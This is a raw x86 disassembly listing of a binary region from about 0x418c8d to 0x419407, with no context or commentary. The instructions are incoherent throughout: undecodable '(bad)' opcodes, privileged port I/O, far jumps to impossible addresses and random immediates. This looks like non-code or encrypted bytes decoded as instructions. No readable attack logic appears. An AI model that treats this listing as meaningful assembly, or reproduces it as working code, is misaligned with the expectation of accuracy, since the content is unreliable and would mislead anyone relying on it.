  418c8d:	popa   
  418c8e:	xlat   BYTE PTR ds:[ebx]
  418c8f:	lods   al,BYTE PTR ds:[esi]
  418c90:	jge    0x418ca3
  418c92:	sub    cl,BYTE PTR [ecx+0x2abccceb]
  418c98:	neg    BYTE PTR [eax+0x48]
  418c9b:	(bad)  [edx+0x19]
  418c9e:	pop    ds
  418c9f:	and    DWORD PTR [eax-0x2b09e589],0x45a8db23
  418ca9:	nop
  418caa:	xchg   DWORD PTR [ebx-0x5e5815d8],esp
  418cb0:	and    BYTE PTR [ebp+0x3e61e6fe],dl
  418cb6:	lds    ecx,FWORD PTR [edi+eiz*8-0x7e]
  418cba:	std    
  418cbb:	aas    
  418cbc:	push   ds
  418cbd:	cmc    
  418cbe:	adc    BYTE PTR [esi-0x53],0x13
  418cc2:	xchg   ebx,eax
  418cc3:	push   esp
  418cc4:	fs dec eax
  418cc6:	or     esi,DWORD PTR [edi-0x73]
  418cc9:	or     eax,0x655c7c58
  418cce:	pop    ebp
  418ccf:	mov    cl,0xb0
  418cd1:	mov    ah,BYTE PTR [ecx+edx*2]
  418cd4:	scas   eax,DWORD PTR es:[edi]
  418cd5:	and    esp,edi
  418cd7:	xchg   esi,eax
  418cd8:	pop    es
  418cd9:	in     eax,0xb4
  418cdb:	aad    0xbc
  418cdd:	mov    DWORD PTR [esi-0x168ffa3f],eax
  418ce3:	repz or al,0x11
  418ce6:	pop    ds
  418ce7:	and    cl,ch
  418ce9:	pop    ebx
  418cea:	sar    BYTE PTR [esi],0xe6
  418ced:	add    al,0xc5
  418cef:	call   0xf7587374
  418cf4:	dec    esp
  418cf5:	dec    esp
  418cf6:	cmp    eax,0xd722d1ac
  418cfb:	int    0xc9
  418cfd:	push   0xad6ddaf9
  418d02:	cmp    edx,DWORD PTR [ebx+0x2]
  418d05:	je     0x418c92
  418d07:	or     DWORD PTR [eax+0x30],esp
  418d0a:	inc    ecx
  418d0b:	sub    bl,al
  418d0d:	sbb    bh,BYTE PTR [ebx-0x738735d9]
  418d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d14:	jecxz  0x418cab
  418d16:	(bad)  
  418d17:	fist   DWORD PTR [esi+0x63]
  418d1a:	cwde   
  418d1b:	aam    0xa0
  418d1d:	push   esi
  418d1e:	and    al,BYTE PTR [ebx+0x60]
  418d21:	int3   
  418d22:	jg     0x418d4e
  418d24:	int    0xa6
  418d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d27:	xlat   BYTE PTR ds:[ebx]
  418d28:	stc    
  418d29:	ins    BYTE PTR es:[edi],dx
  418d2a:	push   0x26
  418d2c:	dec    edx
  418d2d:	pop    ecx
  418d2e:	xor    bh,BYTE PTR [ebx+0x669aa7f9]
  418d34:	(bad)  
  418d35:	mov    al,0x56
  418d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d38:	sahf   
  418d39:	(bad)  
  418d3a:	js     0x418da6
  418d3c:	push   ss
  418d3d:	test   al,0xf4
  418d3f:	fucomp st(5)
  418d41:	xor    bl,dh
  418d43:	fsubr  QWORD PTR [edi]
  418d45:	js     0x418d16
  418d47:	jno    0x418dc8
  418d49:	ins    BYTE PTR es:[edi],dx
  418d4a:	fstp   st(4)
  418d4c:	stos   DWORD PTR es:[edi],eax
  418d4d:	arpl   WORD PTR [esi+0x49a46296],si
  418d53:	push   ecx
  418d54:	jecxz  0x418d91
  418d56:	popa   
  418d57:	mov    bh,0x2d
  418d59:	or     al,0x61
  418d5b:	add    edi,edx
  418d5d:	out    dx,eax
  418d5e:	leave  
  418d5f:	icebp  
  418d60:	mov    WORD PTR [ebp-0x6f7bb834],gs
  418d66:	xor    DWORD PTR [ebx+0x3b],eax
  418d69:	mov    ah,0xd0
  418d6b:	dec    edi
  418d6c:	xor    bh,BYTE PTR [edi]
  418d6e:	jo     0x418d04
  418d70:	cmp    eax,0xda46c2c3
  418d75:	into   
  418d76:	push   ecx
  418d77:	das    
  418d78:	ds cmc 
  418d7a:	cmc    
  418d7b:	mov    dl,0x62
  418d7d:	test   DWORD PTR [ebx],0x293ebbfe
  418d83:	inc    ebp
  418d84:	or     ebx,edi
  418d86:	inc    ebx
  418d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d88:	pop    edx
  418d89:	cmp    DWORD PTR [ebp+0x60],edx
  418d8c:	xchg   esi,eax
  418d8d:	sbb    BYTE PTR [ecx-0x3e2db9d4],dl
  418d93:	xchg   dx,ax
  418d95:	and    al,dl
  418d97:	pop    es
  418d98:	sbb    ebx,DWORD PTR [ecx]
  418d9a:	rcl    DWORD PTR [ecx-0x370d149d],cl
  418da0:	ficomp WORD PTR [ecx+0x79]
  418da3:	push   ecx
  418da4:	or     eax,0x768f9544
  418da9:	jb     0x418d99
  418dab:	mov    edx,0x59c6cdb0
  418db0:	rcr    BYTE PTR [ebx-0x29],1
  418db3:	pop    ecx
  418db4:	sbb    BYTE PTR [edx],dl
  418db6:	jnp    0x418d75
  418db8:	sbb    BYTE PTR [ebp+0x0],0x76
  418dbc:	push   0x478222d
  418dc1:	sbb    al,0x63
  418dc3:	mov    ebx,0xb288e72
  418dc8:	pop    esp
  418dc9:	cmp    cl,BYTE PTR [ecx+0x4a]
  418dcc:	xor    eax,0xc07b191
  418dd1:	push   ecx
  418dd2:	int    0x1a
  418dd4:	pop    edx
  418dd5:	pop    ss
  418dd6:	add    DWORD PTR [eax],eax
  418dd8:	in     eax,0x4c
  418dda:	aad    0x4c
  418ddc:	ficomp DWORD PTR [ebx-0x51]
  418ddf:	mov    ecx,0xcbcee022
  418de4:	add    eax,0xb7edcadf
  418de9:	popa   
  418dea:	jmp    0x72de9923
  418def:	stc    
  418df0:	add    dh,BYTE PTR [ecx]
  418df2:	aaa    
  418df3:	mov    ds:0xfaa6a864,eax
  418df8:	lea    ebp,[ecx-0x11]
  418dfb:	arpl   WORD PTR [edx-0x4b29c033],sp
  418e01:	push   ebx
  418e02:	fidiv  WORD PTR [ebx+0x44]
  418e05:	mov    gs,WORD PTR [edx+0x1e]
  418e08:	sbb    BYTE PTR [edx],0x55
  418e0b:	data16 sbb ah,cl
  418e0e:	hlt    
  418e0f:	in     al,dx
  418e10:	and    BYTE PTR [edx],dl
  418e12:	fisttp WORD PTR [edx+0x758deb09]
  418e18:	pop    ebx
  418e19:	dec    ebx
  418e1a:	outs   dx,BYTE PTR ds:[esi]
  418e1b:	fsubp  st(2),st
  418e1d:	jbe    0x418dde
  418e1f:	xchg   esp,esi
  418e21:	aad    0xe
  418e23:	je     0x418e27
  418e25:	mov    ebx,?
  418e27:	push   ebp
  418e28:	retf   0xf1c4
  418e2b:	jae    0x418ded
  418e2d:	(bad)  
  418e2e:	cli    
  418e2f:	lds    esi,FWORD PTR [edx-0x745a27c5]
  418e35:	pusha  
  418e36:	(bad)  
  418e37:	pop    ecx
  418e38:	scas   eax,DWORD PTR es:[edi]
  418e39:	inc    eax
  418e3a:	jle    0x418dc5
  418e3c:	lahf   
  418e3d:	imul   ebx,DWORD PTR [ecx+0x67],0x703a7d78
  418e44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e45:	ss int3 
  418e47:	jl     0x418e68
  418e49:	retf   0x460f
  418e4c:	and    esi,DWORD PTR ds:0x99375e81
  418e52:	outs   dx,DWORD PTR ds:[esi]
  418e53:	sbb    al,ch
  418e55:	rcr    DWORD PTR [ebx],cl
  418e57:	xor    eax,0x8eb95c14
  418e5c:	jmp    0xdb89944a
  418e61:	cmc    
  418e62:	adc    al,BYTE PTR [edx-0x14]
  418e65:	loop   0x418e9d
  418e67:	jecxz  0x418e37
  418e69:	mov    DWORD PTR [esi-0x14d1ecea],ecx
  418e6f:	fwait
  418e70:	cmc    
  418e71:	and    al,0x76
  418e73:	imul   esp,DWORD PTR [esi-0x70628792],0x4b550c74
  418e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e7e:	pop    eax
  418e7f:	xor    al,0x3
  418e81:	jle    0x418e17
  418e83:	cld    
  418e84:	mov    esp,eax
  418e86:	mov    esp,0x8fd38b87
  418e8b:	(bad)  
  418e8c:	in     eax,dx
  418e8d:	sub    eax,0x30e6b0cf
  418e92:	retf   0xfc6a
  418e95:	test   al,0x65
  418e97:	loope  0x418f0a
  418e99:	xor    al,0xd2
  418e9b:	jmp    0x90a7:0x7ec46718
  418ea2:	ror    al,cl
  418ea4:	stos   BYTE PTR es:[edi],al
  418ea5:	addr16 xchg ebp,eax
  418ea7:	push   edx
  418ea8:	adc    bl,cl
  418eaa:	rcl    ecx,0xed
  418ead:	imul   ebx,DWORD PTR [ebp+0x58feacc2],0xffffffe5
  418eb4:	(bad)  
  418eb5:	adc    eax,0x36caabe6
  418eba:	xor    dh,ch
  418ebc:	sbb    al,0xae
  418ebe:	and    al,0x5e
  418ec0:	push   esi
  418ec1:	in     eax,dx
  418ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ec3:	and    al,0x28
  418ec5:	xor    DWORD PTR [edx],eax
  418ec7:	shl    DWORD PTR [esi],0xb8
  418eca:	imul   ebp,DWORD PTR [eax-0x1f],0xffffffdc
  418ece:	dec    edx
  418ecf:	jnp    0x418f4e
  418ed1:	pop    ds
  418ed2:	add    DWORD PTR [edx],0xffffffa7
  418ed5:	(bad)
  418ed8:	mov    edi,0xa61f5a99
  418edd:	pop    ecx
  418ede:	dec    esi
  418edf:	(bad)  
  418ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ee2:	sub    eax,0x2d9be9a5
  418ee7:	out    dx,eax
  418ee8:	mov    eax,0x5f5e8a5
  418eed:	leave  
  418eee:	xor    ch,BYTE PTR [eax]
  418ef0:	lahf   
  418ef1:	cmp    cl,BYTE PTR [ecx+eiz*2]
  418ef4:	mov    ecx,0xadb69f43
  418ef9:	inc    ecx
  418efa:	mov    ecx,0xefabd661
  418eff:	scas   eax,DWORD PTR es:[edi]
  418f00:	ins    DWORD PTR es:[edi],dx
  418f01:	fcmovnbe st,st(3)
  418f03:	lahf   
  418f04:	add    ch,BYTE PTR [ecx+0x64ad7c69]
  418f0a:	pop    eax
  418f0b:	jecxz  0x418f67
  418f0d:	es jmp 0xf633cfd
  418f13:	loop   0x418f80
  418f15:	jge    0x418f14
  418f17:	pusha  
  418f18:	adc    cl,bl
  418f1a:	retf   0xf77f
  418f1d:	repnz cmp eax,edx
  418f20:	fwait
  418f21:	cmp    DWORD PTR [eax-0x2acba488],ebp
  418f27:	add    eax,0xeb3d0306
  418f2c:	cwde   
  418f2d:	in     eax,dx
  418f2e:	dec    edi
  418f2f:	inc    ebx
  418f30:	and    DWORD PTR [edi-0x607a337e],edx
  418f36:	mov    ebx,es
  418f38:	popf   
  418f39:	leave  
  418f3a:	fcom   DWORD PTR [ebp+0x56]
  418f3d:	mov    ds,edx
  418f3f:	or     bh,BYTE PTR [ebx]
  418f41:	fdivr  QWORD PTR [ebp+0x687b8aec]
  418f47:	nop
  418f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f49:	(bad)  
  418f4a:	sub    al,0x1d
  418f4c:	pop    edi
  418f4d:	addr16 loop 0x418fbd
  418f50:	retf   0xe067
  418f53:	out    dx,al
  418f54:	je     0x418f12
  418f56:	jo     0x418f2b
  418f58:	cdq    
  418f59:	pop    es
  418f5a:	loop   0x418f85
  418f5c:	xchg   ebx,eax
  418f5d:	jnp    0x418f0e
  418f5f:	adc    eax,0x4c9215dd
  418f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f65:	leave  
  418f66:	adc    eax,DWORD PTR [esi+edi*2-0x47]
  418f6a:	xchg   ebx,eax
  418f6b:	or     eax,0x2d0b0eb7
  418f70:	test   BYTE PTR [ebx-0xe5ea2a1],ch
  418f76:	ficom  DWORD PTR [ecx+0x25]
  418f79:	add    al,0x89
  418f7b:	call   0x14f91988
  418f80:	fist   WORD PTR [edi-0x21161175]
  418f86:	add    edi,esi
  418f88:	push   cs
  418f89:	ss inc edi
  418f8b:	inc    ebx
  418f8c:	inc    esi
  418f8d:	repz data16 mov ?,WORD PTR [ebx]
  418f91:	jne    0x418fbe
  418f93:	push   edi
  418f94:	int    0x48
  418f96:	xchg   edi,eax
  418f97:	pop    ds
  418f98:	ins    DWORD PTR es:[edi],dx
  418f99:	(bad)  
  418f9a:	(bad)  [eax-0x1146714a]
  418fa0:	call   0xe6339b01
  418fa5:	push   edx
  418fa6:	sti    
  418fa7:	xor    al,0x7f
  418fa9:	(bad)  
  418faa:	pop    ecx
  418fab:	(bad)  
  418fac:	pop    ds
  418fad:	mov    ecx,0xb97e79aa
  418fb2:	mov    ah,0xac
  418fb4:	(bad)  
  418fb5:	sub    al,0x3
  418fb7:	jb     0x418fef
  418fb9:	or     eax,0x7fbdf655
  418fbe:	pop    ds
  418fbf:	xor    al,0xf5
  418fc1:	stos   BYTE PTR es:[edi],al
  418fc2:	xchg   edx,eax
  418fc3:	dec    DWORD PTR [esi+ebp*1-0x2d]
  418fc7:	cld    
  418fc8:	or     eax,0x8368a9f2
  418fcd:	sbb    al,0x62
  418fcf:	(bad)  
  418fd0:	in     al,0x52
  418fd2:	sub    DWORD PTR [ebx],esi
  418fd4:	std    
  418fd5:	sub    DWORD PTR [ebx+eiz*4-0x21],edi
  418fd9:	sahf   
  418fda:	cmp    BYTE PTR [edi],dh
  418fdc:	inc    ebx
  418fdd:	retf   0x74b9
  418fe0:	rcr    BYTE PTR [esi+0x7eb0d9fd],0x77
  418fe7:	enter  0xaa19,0xb3
  418feb:	sahf   
  418fec:	xchg   ebp,eax
  418fed:	push   edx
  418fee:	fs sbb al,0x17
  418ff1:	(bad)  
  418ff2:	pop    ss
  418ff3:	mov    esp,0xc4974a3c
  418ff8:	inc    edx
  418ff9:	int    0x9b
  418ffb:	xor    al,0xd2
  418ffd:	push   ebp
  418ffe:	adc    al,0x25
  419000:	es clc 
  419002:	add    al,0x9e
  419004:	jge    0x418f8b
  419006:	(bad)  
  419007:	sub    esi,DWORD PTR [ebp-0x1d1ec8a3]
  41900d:	jnp    0x419080
  41900f:	xor    DWORD PTR [ecx],0xfeee19c
  419015:	jp     0x418fec
  419017:	(bad)  
  419018:	mov    bl,0x52
  41901a:	loopne 0x41900f
  41901c:	popa   
  41901d:	fistp  QWORD PTR [edi+edx*1]
  419020:	pop    esi
  419021:	pop    ecx
  419022:	std    
  419023:	sub    BYTE PTR [ebx+esi*2],ah
  419026:	inc    esp
  419027:	xor    al,0xa6
  419029:	sbb    BYTE PTR [esi+ecx*1],0xc8
  41902d:	fwait
  41902e:	imul   edi,DWORD PTR ds:0x70ae5232,0xffffffa3
  419035:	imul   eax,DWORD PTR [edx],0xffffffbd
  419038:	inc    ebp
  419039:	outs   dx,DWORD PTR gs:[esi]
  41903b:	jmp    0x41904e
  41903d:	mov    ebx,0xf019d2d8
  419042:	les    ecx,FWORD PTR [edx+0x619dee56]
  419048:	adc    eax,0x92a11f8d
  41904d:	or     DWORD PTR [esi+ebx*4+0x61],0x38200a67
  419055:	and    ecx,DWORD PTR [ebx+0x7f]
  419058:	and    BYTE PTR [ecx],cl
  41905a:	lds    edx,FWORD PTR [edx+esi*2]
  41905d:	gs pop edx
  41905f:	pop    ds
  419060:	(bad)  
  419061:	out    0x14,al
  419063:	into   
  419064:	add    BYTE PTR [eax+0x5f],cl
  419067:	xchg   ecx,eax
  419068:	idiv   ebp
  41906a:	and    eax,0x85fbc413
  41906f:	arpl   WORD PTR [ecx-0x1e],sp
  419072:	sbb    esi,ebp
  419074:	sahf   
  419075:	push   esp
  419076:	lods   al,BYTE PTR ds:[esi]
  419077:	imul   esp,ebp,0x64741011
  41907d:	cmc    
  41907e:	fs jmp 0x419075
  419081:	push   edx
  419082:	push   ebx
  419083:	outs   dx,DWORD PTR ds:[esi]
  419084:	jl     0x419028
  419086:	push   ss
  419087:	inc    eax
  419088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419089:	nop
  41908a:	aaa    
  41908b:	push   0x35
  41908d:	mov    cl,0x4c
  41908f:	sub    DWORD PTR [edx-0x132653bf],ecx
  419095:	cmp    al,0x63
  419097:	and    BYTE PTR [esi+0x7e],bl
  41909a:	pop    ebx
  41909b:	and    esp,DWORD PTR [edi-0x1c]
  41909e:	fistp  WORD PTR [edi-0x1dae8202]
  4190a4:	iret   
  4190a5:	pop    edi
  4190a6:	or     ah,bh
  4190a8:	std    
  4190a9:	jl     0x41904e
  4190ab:	gs in  eax,0x14
  4190ae:	jmp    0x4190b2
  4190b0:	inc    ecx
  4190b1:	add    DWORD PTR ds:0xe8a37b28,esp
  4190b7:	enter  0xd11e,0x1a
  4190bb:	repnz inc edi
  4190bd:	jnp    0x4190c6
  4190bf:	and    al,0xe5
  4190c1:	popa   
  4190c2:	in     eax,dx
  4190c3:	jb     0x41910f
  4190c5:	cmp    DWORD PTR [eax+0x5b],esp
  4190c8:	cld    
  4190c9:	stos   DWORD PTR es:[edi],eax
  4190ca:	cld    
  4190cb:	dec    ecx
  4190cc:	not    BYTE PTR [edx+0x21]
  4190cf:	nop
  4190d0:	ret    
  4190d1:	fist   WORD PTR [ecx+0x64]
  4190d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190d5:	mov    ah,0x29
  4190d7:	(bad)  
  4190d8:	xlat   BYTE PTR ds:[ebx]
  4190d9:	ja     0x4190fb
  4190db:	jg     0x419116
  4190dd:	xchg   esp,eax
  4190de:	add    BYTE PTR [eax],dl
  4190e0:	loop   0x4190b8
  4190e2:	lods   eax,DWORD PTR ds:[esi]
  4190e3:	and    eax,0x2cd43b82
  4190e8:	(bad)  
  4190e9:	into   
  4190ea:	sahf   
  4190eb:	ja     0x4190e1
  4190ed:	loope  0x419136
  4190ef:	cmp    bh,dh
  4190f1:	(bad)  
  4190f2:	mov    ds:0xc9d0158b,eax
  4190f7:	gs stos DWORD PTR es:[edi],eax
  4190f9:	sbb    DWORD PTR [ebx],esp
  4190fb:	adc    bl,dl
  4190fd:	les    esp,FWORD PTR ds:[eax]
  419100:	gs xor eax,0x92ab3d78
  419106:	xchg   edi,eax
  419107:	lods   al,BYTE PTR ds:[esi]
  419108:	or     eax,0x40ab796a
  41910d:	ins    DWORD PTR es:[edi],dx
  41910e:	fbstp  TBYTE PTR [esi]
  419110:	sub    cl,BYTE PTR [esp+edx*2-0x3c]
  419114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419115:	nop
  419116:	shl    DWORD PTR [ebp+0x722873c3],1
  41911c:	mov    dl,0x56
  41911e:	es xor al,0x9a
  419121:	and    eax,0x70cfb83c
  419126:	loope  0x41917c
  419128:	in     al,dx
  419129:	add    ch,ah
  41912b:	fild   WORD PTR [esi+edi*1-0x55]
  41912f:	jb     0x4190f0
  419131:	icebp  
  419132:	loopne 0x419153
  419134:	test   dl,dh
  419136:	pop    ecx
  419137:	fwait
  419138:	mov    ?,eax
  41913a:	ins    DWORD PTR es:[edi],dx
  41913b:	jecxz  0x419118
  41913d:	jl     0x419186
  41913f:	jns    0x4190f5
  419141:	icebp  
  419142:	sub    bh,BYTE PTR [edi-0xe]
  419145:	or     eax,0xe6793d4a
  41914a:	or     eax,DWORD PTR [esi]
  41914c:	jne    0x419175
  41914e:	dec    ecx
  41914f:	int    0x2a
  419151:	dec    ecx
  419152:	sub    DWORD PTR [ecx-0x5c],ebp
  419155:	jle    0x4191b5
  419157:	sbb    BYTE PTR [ebp+0x53b57b53],dh
  41915d:	rol    DWORD PTR [eax+esi*1-0x2e1992b],1
  419164:	(bad)  
  419165:	jmp    DWORD PTR [ebp+0x27048103]
  41916b:	dec    ecx
  41916c:	mov    bl,0x6e
  41916e:	cmp    al,0x69
  419170:	and    dh,ch
  419172:	push   edi
  419173:	inc    eax
  419174:	and    ebp,ebp
  419176:	outs   dx,BYTE PTR ds:[esi]
  419177:	mul    BYTE PTR [ebx+ebx*4-0x2b2ab8ba]
  41917e:	scas   eax,DWORD PTR es:[edi]
  41917f:	arpl   WORD PTR [edi-0x2d],si
  419182:	ins    BYTE PTR es:[edi],dx
  419183:	loopne 0x419149
  419185:	xchg   DWORD PTR [eax],ecx
  419187:	(bad)  
  419188:	out    dx,eax
  419189:	and    eax,0x555e8b6b
  41918e:	inc    ebx
  41918f:	jmp    FWORD PTR [ebx]
  419191:	inc    edx
  419192:	jmp    0x4191ad
  419194:	punpckhwd mm1,QWORD PTR [ebx]
  419197:	xor    DWORD PTR [edx],edx
  419199:	loopne 0x419127
  41919b:	jp     0x41918c
  41919d:	sbb    BYTE PTR ds:[ecx-0x61],bl
  4191a1:	adc    BYTE PTR [edx],ch
  4191a3:	sub    BYTE PTR [ecx],dl
  4191a5:	lods   eax,DWORD PTR ds:[esi]
  4191a6:	inc    esi
  4191a7:	add    ebx,DWORD PTR [esp+eax*1-0x4e]
  4191ab:	push   es
  4191ac:	add    BYTE PTR [ebp+0x13db493f],0x47
  4191b3:	leave  
  4191b4:	retf   0x8ca6
  4191b7:	sub    ebx,ebx
  4191b9:	ret    0x8841
  4191bc:	mov    esi,0x4a76ec68
  4191c1:	test   ecx,edx
  4191c3:	xchg   DWORD PTR [esi+0x6f],ebp
  4191c6:	fcmovu st,st(2)
  4191c8:	xchg   ebx,eax
  4191c9:	mov    edi,?
  4191cb:	sub    ebp,ebp
  4191cd:	inc    ebx
  4191ce:	test   DWORD PTR [esi+0x4f],edx
  4191d1:	jbe    0x419164
  4191d3:	mov    esi,0x117b507a
  4191d8:	or     bl,BYTE PTR [esi+0x4e]
  4191db:	pushf  
  4191dc:	sar    BYTE PTR [edx+0x1b5dd4c2],0x73
  4191e3:	lods   eax,DWORD PTR ds:[esi]
  4191e4:	sbb    eax,0xd94df248
  4191e9:	popa   
  4191ea:	or     eax,0xb5527278
  4191ef:	icebp  
  4191f0:	push   ds
  4191f1:	mov    al,0xf7
  4191f3:	jb     0x41920a
  4191f5:	pop    ds
  4191f6:	xchg   ebp,eax
  4191f7:	push   edi
  4191f8:	cmp    al,0x9d
  4191fa:	jl     0x4191e0
  4191fc:	jae    0x4191a6
  4191fe:	mov    al,dh
  419200:	jecxz  0x41921b
  419202:	mov    al,0xa2
  419204:	mov    edi,DWORD PTR [ecx]
  419206:	lea    esi,[edi-0x5ca837ef]
  41920c:	push   cs
  41920d:	cmp    al,0xe1
  41920f:	push   ebp
  419210:	sub    dh,BYTE PTR [edi+0x19]
  419213:	jl     0x41924f
  419215:	call   DWORD PTR [ebx+0x32]
  419218:	ror    al,1
  41921a:	cmp    eax,0x84ceff6f
  41921f:	and    al,0x35
  419221:	call   0xbcb36922
  419226:	fcmovu st,st(6)
  419228:	mov    esi,DWORD PTR [ecx-0x5b]
  41922b:	add    DWORD PTR [esi-0x2b5f9bdc],ecx
  419231:	or     ch,ah
  419233:	adc    edi,DWORD PTR [edi-0x78d3f160]
  419239:	xchg   edi,eax
  41923a:	jge    0x419249
  41923c:	imul   eax,DWORD PTR ds:0xad06d4dc,0x1cfbd5db
  419246:	or     al,0xbe
  419248:	pop    es
  419249:	push   cs
  41924a:	fistp  WORD PTR [ebx+0x30]
  41924d:	repz out 0xea,eax
  419250:	mov    esp,DWORD PTR [eax-0x63]
  419253:	fnstenv [ecx]
  419255:	cld    
  419256:	pusha  
  419257:	mov    ch,0x53
  419259:	mov    WORD PTR [edx-0x63],gs
  41925c:	or     edi,DWORD PTR [edi-0x63]
  41925f:	ret    
  419260:	int    0xc5
  419262:	or     DWORD PTR [eax+0x7c],ebx
  419265:	add    ch,bl
  419267:	push   ss
  419268:	xchg   edi,eax
  419269:	fld    TBYTE PTR [edi+0x1e585bba]
  41926f:	fist   WORD PTR [ebp+0x41]
  419272:	rcr    BYTE PTR [edx+esi*8-0x28],1
  419276:	push   ecx
  419277:	mov    esi,esp
  419279:	shl    WORD PTR [esi+0x680b859],1
  419280:	retf   0x93a9
  419283:	das    
  419284:	sbb    eax,0x65fe36ee
  419289:	je     0x419299
  41928b:	xchg   ecx,eax
  41928c:	aaa    
  41928d:	sub    DWORD PTR [ebx],0xf239708b
  419293:	add    BYTE PTR [esp+eax*1+0x1e2c392],al
  41929a:	mov    bl,0xf6
  41929c:	adc    eax,0x91b4399a
  4192a1:	enter  0xee09,0xc4
  4192a5:	or     BYTE PTR [edx+0x259f7a2a],dl
  4192ab:	mov    esi,0x87c4859a
  4192b0:	enter  0x3e51,0xc0
  4192b4:	or     bh,ah
  4192b6:	pop    eax
  4192b7:	repz rcl BYTE PTR [esi-0x75529ee5],1
  4192be:	sbb    al,0x46
  4192c0:	mov    cl,0x1b
  4192c2:	out    0xba,eax
  4192c4:	mov    ch,0xe2
  4192c6:	dec    esi
  4192c7:	jae    0x419310
  4192c9:	inc    eax
  4192ca:	adc    ebx,DWORD PTR [ecx+ebp*4-0x56]
  4192ce:	adc    eax,0xcad0427a
  4192d3:	gs pop ebx
  4192d5:	ja     0x419336
  4192d7:	adc    DWORD PTR [edi],esp
  4192d9:	or     BYTE PTR [esi],0x87
  4192dc:	jmp    0x4192b8
  4192de:	jmp    0xc7fb:0xb29f2bda
  4192e5:	sbb    eax,0xf118e7df
  4192ea:	imul   dh
  4192ec:	jmp    FWORD PTR [esi+0x6fb20119]
  4192f2:	pop    ecx
  4192f3:	int    0xe8
  4192f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192f6:	outs   dx,DWORD PTR ds:[esi]
  4192f7:	jecxz  0x41928f
  4192f9:	dec    edi
  4192fa:	pop    eax
  4192fb:	sbb    ah,BYTE PTR [ebx+0x2]
  4192fe:	cs push 0x64fa6413
  419304:	int3   
  419305:	mov    ecx,0xc8d61df1
  41930a:	mov    WORD PTR [edx-0x74],ds
  41930d:	pop    esp
  41930e:	mov    ebp,0xfb8f7ca2
  419313:	icebp  
  419314:	pop    ds
  419315:	test   eax,0x268c4426
  41931a:	xor    ebp,DWORD PTR [edx-0xe]
  41931d:	xchg   esp,eax
  41931e:	jecxz  0x4192ea
  419320:	ds mov al,0xd
  419323:	xor    BYTE PTR [ecx],0xfb
  419326:	stc    
  419327:	iret   
  419328:	xchg   ecx,eax
  419329:	mov    dh,0x96
  41932b:	cmp    al,0x13
  41932d:	rcl    DWORD PTR [esi],1
  41932f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419330:	add    BYTE PTR [esi-0x5c],bh
  419333:	mov    dl,ch
  419335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419336:	xor    eax,DWORD PTR [ecx]
  419338:	adc    dl,dl
  41933a:	push   ecx
  41933b:	(bad)  
  41933c:	fidivr DWORD PTR [ecx+edi*4]
  41933f:	call   0xc4e0:0xd0ef9758
  419346:	aam    0xe
  419348:	nop
  419349:	iret   
  41934a:	push   es
  41934b:	or     BYTE PTR ds:0x33e74115,cl
  419351:	into   
  419352:	test   eax,0xb6a14237
  419357:	adc    edx,edi
  419359:	out    0xf1,eax
  41935b:	pop    esi
  41935c:	pushf  
  41935d:	cdq    
  41935e:	jns    0x419355
  419360:	mov    bl,0x67
  419362:	setno  BYTE PTR [edx+0x18]
  419366:	jmp    0x9ae1a825
  41936b:	aas    
  41936c:	mov    ds:0x72d12929,eax
  419371:	jmp    0x39267a84
  419376:	and    eax,DWORD PTR [eax+0x3fdc1535]
  41937c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41937d:	cmp    DWORD PTR [edi],edi
  41937f:	mov    al,0x8f
  419381:	mov    al,BYTE PTR [ecx]
  419383:	dec    edi
  419384:	in     al,0xb3
  419386:	push   ecx
  419387:	test   DWORD PTR [ecx+edi*1-0x5c323812],esi
  41938e:	aad    0x21
  419390:	or     eax,ecx
  419392:	pushf  
  419393:	mov    ah,BYTE PTR [edi]
  419395:	xchg   edx,eax
  419396:	stos   BYTE PTR es:[edi],al
  419397:	push   0x4eb5d523
  41939c:	imul   edx,ebp,0xffffffa0
  41939f:	push   0x15
  4193a1:	fmul   QWORD PTR [edx+ebx*2+0x64]
  4193a5:	ficomp DWORD PTR [ebx+0x45]
  4193a8:	es mov cl,0x4e
  4193ab:	push   cs
  4193ac:	fstp   st(1)
  4193ae:	mov    edx,0xf8cf1d6b
  4193b3:	retf   
  4193b4:	mov    bl,0x30
  4193b6:	call   eax
  4193b8:	push   ss
  4193b9:	jl     0x419407
  4193bb:	pop    edx
  4193bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193bd:	std    
  4193be:	arpl   WORD PTR [eax-0x33],cx
  4193c1:	jno    0x419426
  4193c3:	ror    BYTE PTR [ecx],1
  4193c5:	int3   
  4193c6:	das    
  4193c7:	call   0x162b1aa5
  4193cc:	rcl    edx,1
  4193ce:	sbb    al,0x3f
  4193d0:	jbe    0x4193b1
  4193d2:	sbb    al,BYTE PTR [edi+0x157b39bc]
  4193d8:	cdq    
  4193d9:	or     DWORD PTR [esi+0x6b],ebp
  4193dc:	in     al,0x53
  4193de:	pop    ecx
  4193df:	sbb    al,0x7d
  4193e1:	addr16 cmp cl,al
  4193e4:	mov    ebx,0x677bfaf2
  4193e9:	pop    es
  4193ea:	xor    al,0xff
  4193ec:	aas    
  4193ed:	test   DWORD PTR [eax],0x71bbcb2e
  4193f3:	mov    bh,0x1
  4193f5:	jns    0x41944c
  4193f7:	rcr    BYTE PTR [ebx+0x4b],0xa8
  4193fb:	and    BYTE PTR [eax+0x5e],al
  4193fe:	sub    eax,0x3060cfd2
  419403:	xchg   ebx,eax
  419404:	stc    
  419405:	mov    DWORD PTR [edi],ebp
  419407:	stos   BYTE PTR es:[edi],al
